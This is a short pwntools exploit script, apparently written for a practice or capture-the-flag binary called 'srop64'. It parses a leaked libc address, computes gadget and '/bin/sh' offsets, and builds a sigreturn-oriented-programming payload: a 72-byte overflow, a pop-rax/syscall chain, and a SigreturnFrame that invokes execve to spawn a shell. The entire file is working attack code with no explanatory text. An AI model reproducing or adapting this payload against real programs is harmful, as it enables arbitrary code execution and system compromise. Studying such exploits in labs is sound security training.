from pwn import *

context.arch = "amd64"

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

s = '''
set disassembly-flavor intel
b *vuln+75
c
'''

p = process('./srop64')
gdb.attach(p,s)

p.recvuntil(': ')
libc_base = p.recvuntil('\n')
libc_base = int(libc_base, 16)

libc_base -= 0x55800
syscall = libc_base + 0xbc375
pop_rax = libc_base + 0x33544
binsh = libc_base + 0x18cd57

payload = "\x90"*72
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)

frame = SigreturnFrame(arch='amd64')
frame.rax = constants.SYS_execve
frame.rdi = binsh
frame.rsp = syscall
frame.rip = syscall

payload += str(frame)

p.send(payload)
p.interactive()
